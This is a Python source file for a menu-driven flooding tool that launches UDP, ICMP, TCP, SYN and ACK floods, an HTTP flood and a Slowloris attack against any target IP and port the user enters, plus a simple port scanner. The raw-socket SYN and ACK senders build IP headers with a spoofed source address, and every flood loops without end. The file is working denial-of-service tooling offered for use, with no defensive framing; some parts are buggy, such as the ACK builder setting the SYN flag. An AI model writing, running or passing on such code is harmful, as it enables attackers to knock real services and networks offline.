import os
import socket
import struct
import threading
from colorama import Fore, Style, init
import ipaddress
import random


init()

MESSAGE_SIZE = 1000
DEFAULT_THREADS = 10
DEFAULT_DELAY = 0.3

def send_ping(target_ip):
    
    icmp = socket.getprotobyname("icmp")
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp) as sock:
        
        packet_id = threading.current_thread().ident % 65535

        
        packet = struct.pack("BBHHH", 8, 0, 0, packet_id, 1) + b"a" * (MESSAGE_SIZE - 8)

        
        checksum = calculate_checksum(packet)

        
        packet = struct.pack("BBHHH", 8, 0, checksum, packet_id, 1) + b"a" * (MESSAGE_SIZE - 8)

        
        while True:
            try:
                sock.sendto(packet, (target_ip, 0))  
                print(f"{Fore.CYAN}Packet sent to {target_ip}{Style.RESET_ALL}")
            except OSError as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def calculate_checksum(data):
    
    if len(data) % 2:
        data += b"\x00"

    words = struct.unpack("H" * (len(data) // 2), data)
    checksum = sum(words)

    while checksum >> 16:
        checksum = (checksum & 0xffff) + (checksum >> 16)

    checksum = ~checksum & 0xffff

    return checksum

def udp_sender(target_ip, target_port, packet_size):
    
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        
        packet = struct.pack("B" * packet_size, *(0 for _ in range(packet_size)))

        
        while True:
            try:
                sock.sendto(packet, (target_ip, target_port))
                print(f"{Fore.CYAN}Packet sent to {target_ip}:{target_port}{Style.RESET_ALL}")
            except OSError as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def tcp_sender(target_ip, target_port):
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        
        sock.connect((target_ip, target_port))
        print(f"{Fore.CYAN}Connected to {target_ip}:{target_port}{Style.RESET_ALL}")

        
        while True:
            try:
                sock.send(b"a")
                print(f"{Fore.CYAN}Data sent to {target_ip}:{target_port}{Style.RESET_ALL}")
            except OSError as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def syn_sender(target_ip, target_port):
    
    tcp = socket.getprotobyname("tcp")
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, tcp) as sock:
        
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        
        source_port = random.randint(1024, 65535)

        
        packet = build_syn_packet(target_ip, target_port, source_port)

        
        while True:
            try:
                sock.sendto(packet, (target_ip, 0))  
                print(f"{Fore.CYAN}SYN packet sent to {target_ip}:{target_port}{Style.RESET_ALL}")
            except OSError as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def build_syn_packet(target_ip, target_port, source_port):
    
    ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, 12345, 0, 64, 6, 0, socket.inet_aton("127.0.0.1"), socket.inet_aton(target_ip))

    
    tcp_header = struct.pack("!HHLLBBHHH", source_port, target_port, 0, 0, 5 << 4, 2, 8192, 0, 0)

    
    pseudo_header = struct.pack("!4s4sBBH", socket.inet_aton("127.0.0.1"), socket.inet_aton(target_ip), 0, 6, len(tcp_header))
    checksum_data = pseudo_header + tcp_header
    checksum = calculate_tcp_checksum(checksum_data)

    
    tcp_header = tcp_header[:16] + struct.pack("!H", checksum) + tcp_header[18:]

    
    packet = ip_header + tcp_header

    return packet

def calculate_tcp_checksum(data):
    
    if len(data) % 2:
        data += b"\x00"

    words = struct.unpack("!%dH" % (len(data) // 2), data)
    checksum = sum(words)

    while checksum >> 16:
        checksum = (checksum & 0xffff) + (checksum >> 16)

    checksum = ~checksum & 0xffff

    return checksum

def ack_sender(target_ip, target_port):
    
    tcp = socket.getprotobyname("tcp")
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, tcp) as sock:
        
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        
        source_port = random.randint(1024, 65535)

        
        packet = build_ack_packet(target_ip, target_port, source_port)

        
        while True:
            try:
                sock.sendto(packet, (target_ip, 0))  
                print(f"{Fore.CYAN}ACK packet sent to {target_ip}:{target_port}{Style.RESET_ALL}")
            except OSError as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def build_ack_packet(target_ip, target_port, source_port):
    
    ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, 12345, 0, 64, 6, 0, socket.inet_aton("127.0.0.1"), socket.inet_aton(target_ip))

    
    tcp_header = struct.pack("!HHLLBBHHH", source_port, target_port, 0, 0, 5 << 4, 2, 8192, 0, 0)

    
    pseudo_header = struct.pack("!4s4sBBH", socket.inet_aton("127.0.0.1"), socket.inet_aton(target_ip), 0, 6, len(tcp_header))
    checksum_data = pseudo_header + tcp_header
    checksum = calculate_tcp_checksum(checksum_data)

    
    tcp_header = tcp_header[:16] + struct.pack("!H", checksum) + tcp_header[18:]

    
    packet = ip_header + tcp_header

    return packet

def http_flood(target_ip, target_port):
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        
        sock.connect((target_ip, target_port))
        print(f"{Fore.CYAN}Connected to {target_ip}:{target_port}{Style.RESET_ALL}")

        
        while True:
            try:
                request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
                sock.send(request.encode())
                print(f"{Fore.CYAN}HTTP request sent to {target_ip}:{target_port}{Style.RESET_ALL}")
            except OSError as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def slowloris(target_ip, target_port):
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        
        sock.connect((target_ip, target_port))
        print(f"{Fore.CYAN}Connected to {target_ip}:{target_port}{Style.RESET_ALL}")

        
        while True:
            try:
                request = "GET / HTTP/1.1\r\nHost: {}\r\n".format(target_ip)
                sock.send(request.encode())
                print(f"{Fore.CYAN}Partial HTTP request sent to {target_ip}:{target_port}{Style.RESET_ALL}")
            except OSError as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def port_scanner(target_ip, start_port, end_port):
    open_ports = []
    for port in range(start_port, end_port + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(0.01)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
                print(f"{Fore.MAGENTA}Port {port} is open{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}Port {port} is closed{Style.RESET_ALL}")

    if not open_ports:
        print(f"{Fore.YELLOW}No open ports found.{Style.RESET_ALL}")

def auto(target_ip, target_port, flood_type, packet_size):
    if flood_type == "udp":
        t = threading.Thread(target=udp_sender, args=(target_ip, target_port, packet_size))
        t.start()

    elif flood_type == "icmp":
        t = threading.Thread(target=send_ping, args=(target_ip,))
        t.start()

    elif flood_type == "tcp":
        t = threading.Thread(target=tcp_sender, args=(target_ip, target_port))
        t.start()

    elif flood_type == "syn":
        t = threading.Thread(target=syn_sender, args=(target_ip, target_port))
        t.start()

    elif flood_type == "ack":
        t = threading.Thread(target=ack_sender, args=(target_ip, target_port))
        t.start()

    else:
        print(f"{Fore.RED}Invalid flood type!{Style.RESET_ALL}")
        return

    input(f"{Fore.CYAN}Press Enter to stop...{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Stopping {flood_type} flood...{Style.RESET_ALL}")
    t.join()
    print(f"{Fore.BLUE}{flood_type.capitalize()} flood stopped.{Style.RESET_ALL}")

def menu():
    global DEFAULT_THREADS, DEFAULT_DELAY  

    while True:
        print(f"{Fore.MAGENTA}=== Flooding Menu ==={Style.RESET_ALL}")
        print(f"{Fore.CYAN}1. Layer 4 Flood (UDP, ICMP, TCP, SYN, ACK)")
        print("2. Layer 7 Flood (HTTP, Slowloris)")
        print("3. Port Scanner (TCP)")
        print("4. Auto Flood")
        print("5. Change Default Threads (Current: {})".format(DEFAULT_THREADS))
        print("6. Change Default Delay (Current: {} seconds)".format(DEFAULT_DELAY))
        print("8. Help")
        print("9. Quit{Style.RESET_ALL}")

        choice = input(f"{Fore.CYAN}Enter your choice: {Style.RESET_ALL}")

        if choice == "1":
            layer4_menu()

        elif choice == "2":
            layer7_menu()

        elif choice == "3":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            start_port = int(input(f"{Fore.CYAN}Enter starting port: {Style.RESET_ALL}"))
            end_port = int(input(f"{Fore.CYAN}Enter ending port: {Style.RESET_ALL}"))

            port_scanner(target_ip, start_port, end_port)

        elif choice == "4":
            auto_menu()

        elif choice == "5":
            DEFAULT_THREADS = int(input(f"{Fore.CYAN}Enter new default thread count: {Style.RESET_ALL}"))
            print(f"{Fore.GREEN}Default thread count changed to {DEFAULT_THREADS}.{Style.RESET_ALL}")

        elif choice == "6":
            DEFAULT_DELAY = float(input(f"{Fore.CYAN}Enter new default delay (in seconds): {Style.RESET_ALL}"))
            print(f"{Fore.GREEN}Default delay changed to {DEFAULT_DELAY} seconds.{Style.RESET_ALL}")

        elif choice == "8":
            help_menu()

        elif choice == "9":
            print(f"{Fore.MAGENTA}Exiting...{Style.RESET_ALL}")
            break

        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")

def layer4_menu():
    while True:
        print(f"{Fore.MAGENTA}=== Layer 4 Flood Menu ==={Style.RESET_ALL}")
        print(f"{Fore.CYAN}1. UDP Flood")
        print("2. ICMP Flood")
        print("3. TCP Flood")
        print("4. SYN Flood")
        print("5. ACK Flood")
        print("9. Go Back{Style.RESET_ALL}")

        choice = input(f"{Fore.CYAN}Enter your choice: {Style.RESET_ALL}")

        if choice == "1":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))
            packet_size = int(input(f"{Fore.CYAN}Enter packet size: {Style.RESET_ALL}"))

            t = threading.Thread(target=udp_sender, args=(target_ip, target_port, packet_size))
            t.start()

            input(f"{Fore.CYAN}Press Enter to stop...{Style.RESET_ALL}")
            print(f"{Fore.BLUE}Stopping UDP flood...{Style.RESET_ALL}")
            t.join()
            print(f"{Fore.BLUE}UDP flood stopped.{Style.RESET_ALL}")

        elif choice == "2":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")

            t = threading.Thread(target=send_ping, args=(target_ip,))
            t.start()

            input(f"{Fore.CYAN}Press Enter to stop...{Style.RESET_ALL}")
            print(f"{Fore.BLUE}Stopping ICMP flood...{Style.RESET_ALL}")
            t.join()
            print(f"{Fore.BLUE}ICMP flood stopped.{Style.RESET_ALL}")

        elif choice == "3":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))

            t = threading.Thread(target=tcp_sender, args=(target_ip, target_port))
            t.start()

            input(f"{Fore.CYAN}Press Enter to stop...{Style.RESET_ALL}")
            print(f"{Fore.BLUE}Stopping TCP flood...{Style.RESET_ALL}")
            t.join()
            print(f"{Fore.BLUE}TCP flood stopped.{Style.RESET_ALL}")

        elif choice == "4":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))

            t = threading.Thread(target=syn_sender, args=(target_ip, target_port))
            t.start()

            input(f"{Fore.CYAN}Press Enter to stop...{Style.RESET_ALL}")
            print(f"{Fore.BLUE}Stopping SYN flood...{Style.RESET_ALL}")
            t.join()
            print(f"{Fore.BLUE}SYN flood stopped.{Style.RESET_ALL}")

        elif choice == "5":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))

            t = threading.Thread(target=ack_sender, args=(target_ip, target_port))
            t.start()

            input(f"{Fore.CYAN}Press Enter to stop...{Style.RESET_ALL}")
            print(f"{Fore.BLUE}Stopping ACK flood...{Style.RESET_ALL}")
            t.join()
            print(f"{Fore.BLUE}ACK flood stopped.{Style.RESET_ALL}")

        elif choice == "9":
            break

        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")

def layer7_menu():
    while True:
        print(f"{Fore.MAGENTA}=== Layer 7 Flood Menu ==={Style.RESET_ALL}")
        print(f"{Fore.CYAN}1. HTTP Flood")
        print("2. Slowloris")
        print("9. Go Back{Style.RESET_ALL}")

        choice = input(f"{Fore.CYAN}Enter your choice: {Style.RESET_ALL}")

        if choice == "1":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))

            t = threading.Thread(target=http_flood, args=(target_ip, target_port))
            t.start()

            input(f"{Fore.CYAN}Press Enter to stop...{Style.RESET_ALL}")
            print(f"{Fore.BLUE}Stopping HTTP flood...{Style.RESET_ALL}")
            t.join()
            print(f"{Fore.BLUE}HTTP flood stopped.{Style.RESET_ALL}")

        elif choice == "2":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))

            t = threading.Thread(target=slowloris, args=(target_ip, target_port))
            t.start()

            input(f"{Fore.CYAN}Press Enter to stop...{Style.RESET_ALL}")
            print(f"{Fore.BLUE}Stopping Slowloris...{Style.RESET_ALL}")
            t.join()
            print(f"{Fore.BLUE}Slowloris stopped.{Style.RESET_ALL}")

        elif choice == "9":
            break

        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")

def auto_menu():
    while True:
        print(f"{Fore.MAGENTA}=== Auto Flood Menu ==={Style.RESET_ALL}")
        print(f"{Fore.CYAN}1. UDP Flood")
        print("2. ICMP Flood")
        print("3. TCP Flood")
        print("4. SYN Flood")
        print("5. ACK Flood")
        print("9. Go Back{Style.RESET_ALL}")

        choice = input(f"{Fore.CYAN}Enter your choice: {Style.RESET_ALL}")

        if choice == "1":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))
            flood_type = "udp"
            packet_size = int(input(f"{Fore.CYAN}Enter packet size: {Style.RESET_ALL}"))

            auto(target_ip, target_port, flood_type, packet_size)

        elif choice == "2":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            flood_type = "icmp"

            auto(target_ip, None, flood_type, None)

        elif choice == "3":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))
            flood_type = "tcp"

            auto(target_ip, target_port, flood_type, None)

        elif choice == "4":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))
            flood_type = "syn"

            auto(target_ip, target_port, flood_type, None)

        elif choice == "5":
            target_ip = input(f"{Fore.CYAN}Enter target IP: {Style.RESET_ALL}")
            target_port = int(input(f"{Fore.CYAN}Enter target port: {Style.RESET_ALL}"))
            flood_type = "ack"

            auto(target_ip, target_port, flood_type, None)

        elif choice == "9":
            break

        else:
            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")

def help_menu():
    print(f"{Fore.MAGENTA}=== Help Menu ==={Style.RESET_ALL}")
    print(f"{Fore.CYAN}1. Layer 4 Flood:")
    print("   - UDP Flood: Sends UDP packets to a target IP and port.")
    print("   - ICMP Flood: Sends ICMP echo request packets to a target IP.")
    print("   - TCP Flood: Establishes a TCP connection with a target IP and port.")
    print("   - SYN Flood: Sends TCP SYN packets to a target IP and port.")
    print("   - ACK Flood: Sends TCP ACK packets to a target IP and port.")
    print(f"{Fore.CYAN}2. Layer 7 Flood:")
    print("   - HTTP Flood: Sends HTTP requests to a target IP and port.")
    print("   - Slowloris: Sends partial HTTP requests to a target IP and port.")
    print(f"{Fore.CYAN}3. Port Scanner (TCP):")
    print("   - Scans a range of ports on a target IP.")
    print(f"{Fore.CYAN}4. Auto Flood:")
    print("   - Automates the flooding process with default settings.")
    print("   - Allows selection of flood type and parameters.")
    print(f"{Fore.CYAN}5. Change Default Threads:")
    print("   - Changes the default number of threads used in flooding.")
    print(f"{Fore.CYAN}6. Change Default Delay:")
    print("   - Changes the default delay between flood packets (in seconds).")
    print("8. Help: Displays this help menu.")
    print("9. Quit: Exits the program.{Style.RESET_ALL}")

print(Fore.MAGENTA + "a,  8a")
print("`8, `8)                            ,adPPRg,")
print(" 8)  ]8                        ,ad888888888b")
print(",8' ,8'                    ,gPPR888888888888")
print(",8' ,8'                 ,ad8\"\"   `Y888888888P")
print("8)  8)              ,ad8\"\"        (8888888\"\"")
print("8,  8,          ,ad8\"\"            d888\"\"")
print("`8, `8,     ,ad8\"\"            ,ad8\"\"")
print(" `8, `\" ,ad8\"\"            ,ad8\"\"")
print("    ,gPPR8b           ,ad8\"\"")
print("   dP:::::Yb      ,ad8\"\"")
print("   8):::::(8  ,ad8\"\"")
print("   Yb:;;;:d888\"\"  ")
print("    \"8ggg8P\"   ")
print(Style.RESET_ALL)

menu()
